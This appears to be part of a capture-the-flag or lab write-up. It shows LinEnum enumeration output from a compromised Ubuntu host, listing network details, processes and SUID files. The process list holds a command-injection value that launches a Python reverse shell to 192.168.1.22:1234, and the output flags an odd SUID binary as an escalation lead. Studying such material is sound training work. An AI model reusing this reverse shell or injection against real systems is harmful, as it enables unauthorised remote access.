+n/a                          n/a            Wed 2018-10-24 00:22:28 UTC  1 years 6 months ago motd-news.timer              motd-news.service
+
+5 timers listed.
+Enable thorough tests to see inactive timers
+
+
+### NETWORKING  ##########################################
+[-] Network and IP info:
+enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.1.5  netmask 255.255.255.0  broadcast 192.168.1.255
+        inet6 fe80::a00:27ff:fef4:cf9f  prefixlen 64  scopeid 0x20<link>
+        inet6 2a01:e35:2fef:d7e0:a00:27ff:fef4:cf9f  prefixlen 64  scopeid 0x0<global>
+        ether 08:00:27:f4:cf:9f  txqueuelen 1000  (Ethernet)
+        RX packets 457865  bytes 492013279 (492.0 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 264933  bytes 27691222 (27.6 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 288  bytes 24657 (24.6 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 288  bytes 24657 (24.6 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+
+[-] ARP history:
+192.168.1.254 dev enp0s3 lladdr 68:a3:78:8b:0c:dd STALE
+192.168.1.67 dev enp0s3 lladdr 08:00:27:1f:30:76 STALE
+192.168.1.22 dev enp0s3 lladdr 08:00:27:1f:30:76 REACHABLE
+fe80::6aa3:78ff:fe8b:cdd dev enp0s3 lladdr 68:a3:78:8b:0c:dd router STALE
+
+
+[-] Nameserver(s):
+nameserver 127.0.0.53
+
+
+[-] Nameserver(s):
+Global
+          DNSSEC NTA: 10.in-addr.arpa
+                      16.172.in-addr.arpa
+                      168.192.in-addr.arpa
+                      17.172.in-addr.arpa
+                      18.172.in-addr.arpa
+                      19.172.in-addr.arpa
+                      20.172.in-addr.arpa
+                      21.172.in-addr.arpa
+                      22.172.in-addr.arpa
+                      23.172.in-addr.arpa
+                      24.172.in-addr.arpa
+                      25.172.in-addr.arpa
+                      26.172.in-addr.arpa
+                      27.172.in-addr.arpa
+                      28.172.in-addr.arpa
+                      29.172.in-addr.arpa
+                      30.172.in-addr.arpa
+                      31.172.in-addr.arpa
+                      corp
+                      d.f.ip6.arpa
+                      home
+                      internal
+                      intranet
+                      lan
+                      local
+                      private
+                      test
+
+Link 2 (enp0s3)
+      Current Scopes: DNS
+       LLMNR setting: yes
+MulticastDNS setting: no
+      DNSSEC setting: no
+    DNSSEC supported: no
+         DNS Servers: 192.168.1.254
+                      fd0f:ee:b0::1
+
+
+[-] Default route:
+default via 192.168.1.254 dev enp0s3 proto dhcp src 192.168.1.5 metric 100 
+
+
+[-] Listening TCP:
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp       21      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      25571/sh            
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+
+
+[-] Listening UDP:
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+udp    21504      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 192.168.1.5:68          0.0.0.0:*                           -                   
+
+
+### SERVICES #############################################
+[-] Running processes:
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.6  77952  6288 ?        Ss   Apr24   0:06 /sbin/init maybe-ubiquity
+root         2  0.0  0.0      0     0 ?        S    Apr24   0:00 [kthreadd]
+root         4  0.0  0.0      0     0 ?        I<   Apr24   0:00 [kworker/0:0H]
+root         6  0.0  0.0      0     0 ?        I<   Apr24   0:00 [mm_percpu_wq]
+root         7  0.1  0.0      0     0 ?        S    Apr24   0:18 [ksoftirqd/0]
+root         8  0.0  0.0      0     0 ?        I    Apr24   0:03 [rcu_sched]
+root         9  0.0  0.0      0     0 ?        I    Apr24   0:00 [rcu_bh]
+root        10  0.0  0.0      0     0 ?        S    Apr24   0:00 [migration/0]
+root        11  0.0  0.0      0     0 ?        S    Apr24   0:00 [watchdog/0]
+root        12  0.0  0.0      0     0 ?        S    Apr24   0:00 [cpuhp/0]
+root        13  0.0  0.0      0     0 ?        S    Apr24   0:00 [kdevtmpfs]
+root        14  0.0  0.0      0     0 ?        I<   Apr24   0:00 [netns]
+root        15  0.0  0.0      0     0 ?        S    Apr24   0:00 [rcu_tasks_kthre]
+root        16  0.0  0.0      0     0 ?        S    Apr24   0:00 [kauditd]
+root        17  0.0  0.0      0     0 ?        S    Apr24   0:00 [khungtaskd]
+root        18  0.0  0.0      0     0 ?        S    Apr24   0:00 [oom_reaper]
+root        19  0.0  0.0      0     0 ?        I<   Apr24   0:00 [writeback]
+root        20  0.0  0.0      0     0 ?        S    Apr24   0:00 [kcompactd0]
+root        21  0.0  0.0      0     0 ?        SN   Apr24   0:00 [ksmd]
+root        22  0.0  0.0      0     0 ?        SN   Apr24   0:00 [khugepaged]
+root        23  0.0  0.0      0     0 ?        I<   Apr24   0:00 [crypto]
+root        24  0.0  0.0      0     0 ?        I<   Apr24   0:00 [kintegrityd]
+root        25  0.0  0.0      0     0 ?        I<   Apr24   0:00 [kblockd]
+root        26  0.0  0.0      0     0 ?        I<   Apr24   0:00 [ata_sff]
+root        27  0.0  0.0      0     0 ?        I<   Apr24   0:00 [md]
+root        28  0.0  0.0      0     0 ?        I<   Apr24   0:00 [edac-poller]
+root        29  0.0  0.0      0     0 ?        I<   Apr24   0:00 [devfreq_wq]
+root        30  0.0  0.0      0     0 ?        I<   Apr24   0:00 [watchdogd]
+root        32  0.0  0.0      0     0 ?        I    Apr24   0:04 [kworker/0:1]
+root        34  0.5  0.0      0     0 ?        S    Apr24   1:01 [kswapd0]
+root        35  0.0  0.0      0     0 ?        S    Apr24   0:00 [ecryptfs-kthrea]
+root        77  0.0  0.0      0     0 ?        I<   Apr24   0:00 [kthrotld]
+root        78  0.0  0.0      0     0 ?        I<   Apr24   0:00 [acpi_thermal_pm]
+root        79  0.0  0.0      0     0 ?        S    Apr24   0:00 [scsi_eh_0]
+root        80  0.0  0.0      0     0 ?        I<   Apr24   0:00 [scsi_tmf_0]
+root        81  0.0  0.0      0     0 ?        S    Apr24   0:00 [scsi_eh_1]
+root        82  0.0  0.0      0     0 ?        I<   Apr24   0:00 [scsi_tmf_1]
+root        88  0.0  0.0      0     0 ?        I<   Apr24   0:00 [ipv6_addrconf]
+root        97  0.0  0.0      0     0 ?        I<   Apr24   0:00 [kstrp]
+root       114  0.0  0.0      0     0 ?        I<   Apr24   0:00 [charger_manager]
+root       179  0.0  0.0      0     0 ?        I<   Apr24   0:08 [kworker/0:1H]
+root       188  0.0  0.0      0     0 ?        S    Apr24   0:00 [scsi_eh_2]
+root       189  0.0  0.0      0     0 ?        I<   Apr24   0:00 [scsi_tmf_2]
+root       263  0.0  0.0      0     0 ?        I<   Apr24   0:00 [raid5wq]
+root       314  0.0  0.0      0     0 ?        S    Apr24   0:01 [jbd2/sda2-8]
+root       315  0.0  0.0      0     0 ?        I<   Apr24   0:00 [ext4-rsv-conver]
+root       378  0.0  1.1 111184 11392 ?        S<s  Apr24   0:00 /lib/systemd/systemd-journald
+root       388  0.0  0.0      0     0 ?        I<   Apr24   0:00 [iscsi_eh]
+root       389  0.0  0.0      0     0 ?        I<   Apr24   0:00 [ib-comp-wq]
+root       390  0.0  0.0      0     0 ?        I<   Apr24   0:00 [ib_mcast]
+root       391  0.0  0.0      0     0 ?        I<   Apr24   0:00 [ib_nl_sa_wq]
+root       392  0.0  0.0      0     0 ?        I<   Apr24   0:00 [rdma_cm]
+root       407  0.0  0.0 105904   712 ?        Ss   Apr24   0:00 /sbin/lvmetad -f
+root       433  0.0  0.0      0     0 ?        S<   Apr24   0:00 [loop0]
+root       434  0.0  0.0      0     0 ?        S<   Apr24   0:00 [loop1]
+systemd+   441  0.0  0.2 141912  2916 ?        Ssl  Apr24   0:00 /lib/systemd/systemd-timesyncd
+root       471  0.0  0.0      0     0 ?        I<   Apr24   0:00 [iprt-VBoxWQueue]
+root       517  0.0  0.0      0     0 ?        I<   Apr24   0:00 [ttm_swap]
+systemd+   583  0.0  0.3  80140  3276 ?        Ss   Apr24   0:00 /lib/systemd/systemd-networkd
+systemd+   585  0.0  0.3  70612  3736 ?        Ss   Apr24   0:00 /lib/systemd/systemd-resolved
+daemon     694  0.0  0.1  28332  2004 ?        Ss   Apr24   0:00 /usr/sbin/atd -f
+root       695  0.0  0.1  25376  1576 ?        Ss   Apr24   0:00 /sbin/iscsid
+root       697  0.0  0.5  25880  5280 ?        S<Ls Apr24   0:00 /sbin/iscsid
+root       699  0.0  0.2 169136  2344 ?        Ssl  Apr24   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
+root       705  0.0  0.2 636996  2996 ?        Ssl  Apr24   0:02 /usr/bin/lxcfs /var/lib/lxcfs/
+root       707  0.0  0.2  30028  2272 ?        Ss   Apr24   0:00 /usr/sbin/cron -f
+root       708  0.0  0.2  62132  2728 ?        Ss   Apr24   0:00 /lib/systemd/systemd-logind
+root       709  0.0  0.1 286232  1860 ?        Ssl  Apr24   0:00 /usr/lib/accountsservice/accounts-daemon
+syslog     710  0.0  0.2 267272  2204 ?        Ssl  Apr24   0:00 /usr/sbin/rsyslogd -n
+message+   712  0.0  0.3  50272  3656 ?        Ss   Apr24   0:01 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+root       767  0.0  0.1  14888  1428 tty1     Ss+  Apr24   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
+root       771  0.0  0.3 288872  3248 ?        Ssl  Apr24   0:00 /usr/lib/policykit-1/polkitd --no-debug
+uuidd      829  0.0  0.0  26844   320 ?        Ss   Apr24   0:00 /usr/sbin/uuidd --socket-activation
+root      1311  0.0  0.0      0     0 ?        S<   Apr24   0:00 [loop2]
+root      1343  0.0  1.0 628568 10372 ?        Ssl  Apr24   0:06 /usr/lib/snapd/snapd
+root      5867  0.0  0.2  45164  3016 ?        Ss   00:21   0:00 /lib/systemd/systemd-udevd
+clamav   16368  0.0  0.1 229864  1524 ?        Ss   00:23   0:00 /usr/bin/freshclam -d --foreground=true
+root     24809  0.0  0.1  72300  1544 ?        Ss   00:13   0:00 /usr/sbin/sshd -D
+root     25527  0.0  0.0      0     0 ?        I    01:57   0:00 [kworker/u2:2]
+scanner  25571  0.0  0.0   4628   608 ?        S    02:23   0:00 /bin/sh -c clamscan /etc/passwd; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.22",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+scanner  25573  0.0  0.1  34764  1748 ?        S    02:24   0:00 python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.22",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+scanner  25574  0.0  0.1   4628  1744 ?        S    02:24   0:00 /bin/sh -i
+root     25814  0.0  0.0      0     0 ?        I    02:30   0:00 [kworker/u2:0]
+root     25815  0.0  0.0      0     0 ?        I    02:30   0:00 [kworker/0:2]
+root     25835  0.0  0.0      0     0 ?        I    02:36   0:00 [kworker/u2:1]
+scanner  25870  0.0  0.3  12384  3960 ?        S    02:58   0:00 /bin/bash ./LinEnum.sh -t
+scanner  25871  0.0  0.3  12584  3100 ?        S    02:58   0:00 /bin/bash ./LinEnum.sh -t
+scanner  25872  0.0  0.0   6180   748 ?        S    02:58   0:00 tee -a
+scanner  26445  0.0  0.2  12584  2844 ?        S    02:58   0:00 /bin/bash ./LinEnum.sh -t
+scanner  26446  0.0  0.3  38376  3620 ?        R    02:58   0:00 ps aux
+
+
+[-] Process binaries and associated permissions (from above list):
+-rwxr-xr-x 1 root root  1113504 Apr  4  2018 /bin/bash
+lrwxrwxrwx 1 root root        4 Jul 25  2018 /bin/sh -> dash
+-rwxr-xr-x 1 root root   129096 Jul 20  2018 /lib/systemd/systemd-journald
+-rwxr-xr-x 1 root root   219272 Jul 20  2018 /lib/systemd/systemd-logind
+-rwxr-xr-x 1 root root  1616976 Jul 20  2018 /lib/systemd/systemd-networkd
+-rwxr-xr-x 1 root root   378944 Jul 20  2018 /lib/systemd/systemd-resolved
+-rwxr-xr-x 1 root root    38976 Jul 20  2018 /lib/systemd/systemd-timesyncd
+-rwxr-xr-x 1 root root   584136 Feb  5 01:07 /lib/systemd/systemd-udevd
+-rwxr-xr-x 1 root root    56552 May 16  2018 /sbin/agetty
+lrwxrwxrwx 1 root root       20 Feb  5 01:07 /sbin/init -> /lib/systemd/systemd
+-rwxr-xr-x 1 root root   407704 Feb 21  2018 /sbin/iscsid
+-rwxr-xr-x 1 root root    84104 Apr 12  2018 /sbin/lvmetad
+-rwxr-xr-x 1 root root   236584 Jun 10  2019 /usr/bin/dbus-daemon
+-rwxr-xr-x 1 root root   149600 Feb 11 13:45 /usr/bin/freshclam
+-rwxr-xr-x 1 root root    18504 Jun 16  2018 /usr/bin/lxcfs
+lrwxrwxrwx 1 root root        9 Jun 21  2018 /usr/bin/python3 -> python3.6
+-rwxr-xr-x 1 root root   182552 Dec 18  2017 /usr/lib/accountsservice/accounts-daemon
+-rwxr-xr-x 1 root root    14552 Jul 13  2018 /usr/lib/policykit-1/polkitd
+-rwxr-xr-x 1 root root 16142536 Jul 19  2018 /usr/lib/snapd/snapd
+-rwxr-xr-x 1 root root    26632 Feb 20  2018 /usr/sbin/atd
+-rwxr-xr-x 1 root root    47416 Nov 16  2017 /usr/sbin/cron
+-rwxr-xr-x 1 root root   680488 Apr 24  2018 /usr/sbin/rsyslogd
+-rwxr-xr-x 1 root root   786856 Feb 10  2018 /usr/sbin/sshd
+-rwxr-xr-x 1 root root    34976 May 16  2018 /usr/sbin/uuidd
+
+
+[-] /etc/init.d/ binary permissions:
+total 176
+drwxr-xr-x  2 root root 4096 Apr 25 00:23 .
+drwxr-xr-x 94 root root 4096 Apr 25 00:23 ..
+-rwxr-xr-x  1 root root 2269 Apr 22  2017 acpid
+-rwxr-xr-x  1 root root 4335 Mar 22  2018 apparmor
+-rwxr-xr-x  1 root root 2805 Feb 27 03:18 apport
+-rwxr-xr-x  1 root root 1071 Aug 21  2015 atd
+-rwxr-xr-x  1 root root 7692 Oct 10  2018 clamav-freshclam
+-rwxr-xr-x  1 root root 1232 Apr 19  2018 console-setup.sh
+-rwxr-xr-x  1 root root 3049 Nov 16  2017 cron
+-rwxr-xr-x  1 root root  937 Mar 18  2018 cryptdisks
+-rwxr-xr-x  1 root root  978 Mar 18  2018 cryptdisks-early
+-rwxr-xr-x  1 root root 2813 Nov 15  2017 dbus
+-rwxr-xr-x  1 root root 4489 Jun 28  2018 ebtables
+-rwxr-xr-x  1 root root  985 Jul 16  2018 grub-common
+-rwxr-xr-x  1 root root 3809 Feb 14  2018 hwclock.sh
+-rwxr-xr-x  1 root root 2444 Oct 25  2017 irqbalance
+-rwxr-xr-x  1 root root 1503 Feb 21  2018 iscsid
+-rwxr-xr-x  1 root root 1479 Feb 15  2018 keyboard-setup.sh
+-rwxr-xr-x  1 root root 2044 Aug 15  2017 kmod
+-rwxr-xr-x  1 root root  695 Dec  3  2017 lvm2
+-rwxr-xr-x  1 root root  571 Dec  3  2017 lvm2-lvmetad
+-rwxr-xr-x  1 root root  586 Dec  3  2017 lvm2-lvmpolld
+-rwxr-xr-x  1 root root 2378 Jun 16  2018 lxcfs
+-rwxr-xr-x  1 root root 2240 Jun  5  2018 lxd
+-rwxr-xr-x  1 root root 2653 Jun 26  2018 mdadm
+-rwxr-xr-x  1 root root 1249 Jun 26  2018 mdadm-waitidle
+-rwxr-xr-x  1 root root 2503 Feb 21  2018 open-iscsi
+-rwxr-xr-x  1 root root 1846 Mar 22  2018 open-vm-tools
+-rwxr-xr-x  1 root root 1366 Jan 17  2018 plymouth
+-rwxr-xr-x  1 root root  752 Jan 17  2018 plymouth-log
+-rwxr-xr-x  1 root root 1191 Jan 17  2018 procps
+-rwxr-xr-x  1 root root 4355 Dec 13  2017 rsync
+-rwxr-xr-x  1 root root 2864 Jan 14  2018 rsyslog
+-rwxr-xr-x  1 root root 1222 May 21  2017 screen-cleanup
+-rwxr-xr-x  1 root root 3837 Jan 25  2018 ssh
+-rwxr-xr-x  1 root root 5974 Apr 20  2018 udev
+-rwxr-xr-x  1 root root 2083 Aug 15  2017 ufw
+-rwxr-xr-x  1 root root 1391 Jul 18  2018 unattended-upgrades
+-rwxr-xr-x  1 root root 1306 May 16  2018 uuidd
+
+
+[-] /lib/systemd/* config file permissions:
+/lib/systemd/:
+total 6.8M
+drwxr-xr-x 22 root root  20K Apr 25 00:23 system
+drwxr-xr-x  2 root root 4.0K Apr 25 00:22 system-generators
+drwxr-xr-x  2 root root 4.0K Apr 25 00:21 network
+-rwxr-xr-x  1 root root 571K Feb  5 01:07 systemd-udevd
+drwxr-xr-x  2 root root 4.0K Jul 25  2018 system-sleep
+drwxr-xr-x  2 root root 4.0K Jul 25  2018 system-shutdown
+drwxr-xr-x  2 root root 4.0K Jul 25  2018 system-preset
+-rw-r--r--  1 root root 2.3M Jul 20  2018 libsystemd-shared-237.so
+-rwxr-xr-x  1 root root 1.3K Jul 20  2018 set-cpufreq
+-rwxr-xr-x  1 root root 1.6M Jul 20  2018 systemd
+-rwxr-xr-x  1 root root 6.0K Jul 20  2018 systemd-ac-power
+-rwxr-xr-x  1 root root  18K Jul 20  2018 systemd-backlight
+-rwxr-xr-x  1 root root  11K Jul 20  2018 systemd-binfmt
+-rwxr-xr-x  1 root root  10K Jul 20  2018 systemd-cgroups-agent
+-rwxr-xr-x  1 root root  22K Jul 20  2018 systemd-cryptsetup
+-rwxr-xr-x  1 root root  15K Jul 20  2018 systemd-dissect
+-rwxr-xr-x  1 root root  18K Jul 20  2018 systemd-fsck
+-rwxr-xr-x  1 root root  23K Jul 20  2018 systemd-fsckd
+-rwxr-xr-x  1 root root  19K Jul 20  2018 systemd-growfs
+-rwxr-xr-x  1 root root  10K Jul 20  2018 systemd-hibernate-resume
+-rwxr-xr-x  1 root root  23K Jul 20  2018 systemd-hostnamed
+-rwxr-xr-x  1 root root  15K Jul 20  2018 systemd-initctl
+-rwxr-xr-x  1 root root 127K Jul 20  2018 systemd-journald
+-rwxr-xr-x  1 root root  35K Jul 20  2018 systemd-localed
+-rwxr-xr-x  1 root root 215K Jul 20  2018 systemd-logind
+-rwxr-xr-x  1 root root  10K Jul 20  2018 systemd-makefs
+-rwxr-xr-x  1 root root  15K Jul 20  2018 systemd-modules-load
+-rwxr-xr-x  1 root root 1.6M Jul 20  2018 systemd-networkd
+-rwxr-xr-x  1 root root  19K Jul 20  2018 systemd-networkd-wait-online
+-rwxr-xr-x  1 root root  11K Jul 20  2018 systemd-quotacheck
+-rwxr-xr-x  1 root root  10K Jul 20  2018 systemd-random-seed
+-rwxr-xr-x  1 root root  15K Jul 20  2018 systemd-remount-fs
+-rwxr-xr-x  1 root root  10K Jul 20  2018 systemd-reply-password
+-rwxr-xr-x  1 root root 371K Jul 20  2018 systemd-resolved
+-rwxr-xr-x  1 root root  19K Jul 20  2018 systemd-rfkill
+-rwxr-xr-x  1 root root  43K Jul 20  2018 systemd-shutdown
+-rwxr-xr-x  1 root root  19K Jul 20  2018 systemd-sleep
+-rwxr-xr-x  1 root root  23K Jul 20  2018 systemd-socket-proxyd
+-rwxr-xr-x  1 root root  11K Jul 20  2018 systemd-sulogin-shell
+-rwxr-xr-x  1 root root  15K Jul 20  2018 systemd-sysctl
+-rwxr-xr-x  1 root root  27K Jul 20  2018 systemd-timedated
+-rwxr-xr-x  1 root root  39K Jul 20  2018 systemd-timesyncd
+-rwxr-xr-x  1 root root  15K Jul 20  2018 systemd-update-utmp
+-rwxr-xr-x  1 root root  10K Jul 20  2018 systemd-user-sessions
+-rwxr-xr-x  1 root root  10K Jul 20  2018 systemd-veritysetup
+-rwxr-xr-x  1 root root  10K Jul 20  2018 systemd-volatile-root
+-rwxr-xr-x  1 root root 1.3K Jun 22  2018 systemd-sysv-install
+-rw-r--r--  1 root root  685 Jan 28  2018 resolv.conf
+
+<SNIP>
+
+### SOFTWARE #############################################
+[-] Sudo version:
+Sudo version 1.8.21p2
+
+
+### INTERESTING FILES ####################################
+[-] Useful file locations:
+/bin/nc
+/bin/netcat
+/usr/bin/wget
+/usr/bin/gcc
+/usr/bin/curl
+
+
+[-] Installed compilers:
+ii  g++                                   4:7.3.0-3ubuntu2.1                              amd64        GNU C++ compiler
+ii  g++-7                                 7.3.0-27ubuntu1~18.04                           amd64        GNU C++ compiler
+ii  gcc                                   4:7.3.0-3ubuntu2.1                              amd64        GNU C compiler
+ii  gcc-7                                 7.3.0-27ubuntu1~18.04                           amd64        GNU C compiler
+ii  libllvm3.9:amd64                      1:3.9.1-19ubuntu1                               amd64        Modular compiler and toolchain technologies, runtime library
+
+
+[-] Can we read/write sensitive files:
+-rw-r--r-- 1 root root 1664 Oct 21  2018 /etc/passwd
+-rw-r--r-- 1 root root 737 Oct 21  2018 /etc/group
+-rw-r--r-- 1 root root 581 Apr  9  2018 /etc/profile
+-rw-r----- 1 root shadow 1084 Oct 21  2018 /etc/shadow
+
+
+[-] SUID files:
+-rwsr-xr-- 1 root messagebus 42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-sr-x 1 root root 101208 Jul 19  2018 /usr/lib/snapd/snap-confine
+-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 436552 Feb 10  2018 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 14328 Jul 13  2018 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root root 80056 Aug  1  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+-rwsr-xr-x 1 root root 22520 Jul 13  2018 /usr/bin/pkexec
+-rwsr-xr-x 1 root root 18448 Mar  9  2017 /usr/bin/traceroute6.iputils
+-rwsr-xr-x 1 root root 59640 Jan 25  2018 /usr/bin/passwd
+-rwsr-xr-x 1 root root 37136 Jan 25  2018 /usr/bin/newgidmap
+-rwsr-xr-x 1 root root 37136 Jan 25  2018 /usr/bin/newuidmap
+-rwsr-xr-x 1 root root 44528 Jan 25  2018 /usr/bin/chsh
+-rwsr-xr-x 1 root root 75824 Jan 25  2018 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 40344 Jan 25  2018 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 76496 Jan 25  2018 /usr/bin/chfn
+-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
+-rwsr-xr-x 1 root root 149080 Jan 31 17:18 /usr/bin/sudo
+-rwsr-xr-x 1 root scanner 8576 Oct 24  2018 /home/scanner/update_cloudav
+-rwsr-xr-x 1 root root 40152 May 16  2018 /snap/core/5662/bin/mount
+-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/5662/bin/ping
+-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/5662/bin/ping6
+-rwsr-xr-x 1 root root 40128 May 17  2017 /snap/core/5662/bin/su
+-rwsr-xr-x 1 root root 27608 May 16  2018 /snap/core/5662/bin/umount
+-rwsr-xr-x 1 root root 71824 May 17  2017 /snap/core/5662/usr/bin/chfn
+-rwsr-xr-x 1 root root 40432 May 17  2017 /snap/core/5662/usr/bin/chsh
+-rwsr-xr-x 1 root root 75304 May 17  2017 /snap/core/5662/usr/bin/gpasswd
+-rwsr-xr-x 1 root root 39904 May 17  2017 /snap/core/5662/usr/bin/newgrp
+-rwsr-xr-x 1 root root 54256 May 17  2017 /snap/core/5662/usr/bin/passwd
+-rwsr-xr-x 1 root root 136808 Jul  4  2017 /snap/core/5662/usr/bin/sudo
+-rwsr-xr-- 1 root systemd-resolve 42992 Jan 12  2017 /snap/core/5662/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 428240 Jan 18  2018 /snap/core/5662/usr/lib/openssh/ssh-keysign
+-rwsr-sr-x 1 root root 98472 Oct  5  2018 /snap/core/5662/usr/lib/snapd/snap-confine
+-rwsr-xr-- 1 root dip 390888 Jan 29  2016 /snap/core/5662/usr/sbin/pppd
+-rwsr-xr-x 1 root root 40152 Nov 30  2017 /snap/core/4917/bin/mount
+-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/4917/bin/ping
+-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/4917/bin/ping6
+-rwsr-xr-x 1 root root 40128 May 17  2017 /snap/core/4917/bin/su
+-rwsr-xr-x 1 root root 27608 Nov 30  2017 /snap/core/4917/bin/umount
+-rwsr-xr-x 1 root root 71824 May 17  2017 /snap/core/4917/usr/bin/chfn
+-rwsr-xr-x 1 root root 40432 May 17  2017 /snap/core/4917/usr/bin/chsh
+-rwsr-xr-x 1 root root 75304 May 17  2017 /snap/core/4917/usr/bin/gpasswd
+-rwsr-xr-x 1 root root 39904 May 17  2017 /snap/core/4917/usr/bin/newgrp
+-rwsr-xr-x 1 root root 54256 May 17  2017 /snap/core/4917/usr/bin/passwd
+-rwsr-xr-x 1 root root 136808 Jul  4  2017 /snap/core/4917/usr/bin/sudo
+-rwsr-xr-- 1 root systemd-resolve 42992 Jan 12  2017 /snap/core/4917/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 428240 Jan 18  2018 /snap/core/4917/usr/lib/openssh/ssh-keysign
+-rwsr-sr-x 1 root root 98440 Jun 21  2018 /snap/core/4917/usr/lib/snapd/snap-confine
+-rwsr-xr-- 1 root dip 390888 Jan 29  2016 /snap/core/4917/usr/sbin/pppd
+-rwsr-xr-x 1 root root 40152 Jan 27 14:28 /snap/core/9066/bin/mount
+-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/9066/bin/ping
+-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/9066/bin/ping6
+-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/9066/bin/su
+-rwsr-xr-x 1 root root 27608 Jan 27 14:28 /snap/core/9066/bin/umount
+-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/9066/usr/bin/chfn
+-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/9066/usr/bin/chsh
+-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/9066/usr/bin/gpasswd
+-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/9066/usr/bin/newgrp
+-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/9066/usr/bin/passwd
+-rwsr-xr-x 1 root root 136808 Jan 31 18:37 /snap/core/9066/usr/bin/sudo
+-rwsr-xr-- 1 root systemd-resolve 42992 Nov 29 12:40 /snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/9066/usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 110792 Apr 10 16:44 /snap/core/9066/usr/lib/snapd/snap-confine
+-rwsr-xr-- 1 root dip 394984 Feb 11 15:40 /snap/core/9066/usr/sbin/pppd
+-rwsr-xr-x 1 root root 43088 May 16  2018 /bin/mount
+-rwsr-xr-x 1 root root 44664 Jan 25  2018 /bin/su
+-rwsr-xr-x 1 root root 64424 Mar  9  2017 /bin/ping
+-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
+-rwsr-xr-x 1 root root 26696 May 16  2018 /bin/umount
+
+
+[-] SGID files:
+-rwsr-sr-x 1 root root 101208 Jul 19  2018 /usr/lib/snapd/snap-confine
+-rwxr-sr-x 1 root utmp 10232 Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
+-rwxr-sr-x 1 root shadow 22808 Jan 25  2018 /usr/bin/expiry
+-rwxr-sr-x 1 root shadow 71816 Jan 25  2018 /usr/bin/chage
+-rwxr-sr-x 1 root mlocate 43088 Mar  1  2018 /usr/bin/mlocate
+-rwxr-sr-x 1 root tty 14328 Jan 17  2018 /usr/bin/bsd-write
+-rwxr-sr-x 1 root tty 30800 May 16  2018 /usr/bin/wall
+-rwxr-sr-x 1 root crontab 39352 Nov 16  2017 /usr/bin/crontab
+-rwxr-sr-x 1 root ssh 362640 Feb 10  2018 /usr/bin/ssh-agent
+-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
+-rwxr-sr-x 1 root shadow 35632 Apr  9  2018 /snap/core/5662/sbin/pam_extrausers_chkpwd
+-rwxr-sr-x 1 root shadow 35600 Apr  9  2018 /snap/core/5662/sbin/unix_chkpwd
+-rwxr-sr-x 1 root shadow 62336 May 17  2017 /snap/core/5662/usr/bin/chage
+-rwxr-sr-x 1 root systemd-network 36080 Apr  5  2016 /snap/core/5662/usr/bin/crontab
+-rwxr-sr-x 1 root mail 14856 Dec  7  2013 /snap/core/5662/usr/bin/dotlockfile
+-rwxr-sr-x 1 root shadow 22768 May 17  2017 /snap/core/5662/usr/bin/expiry
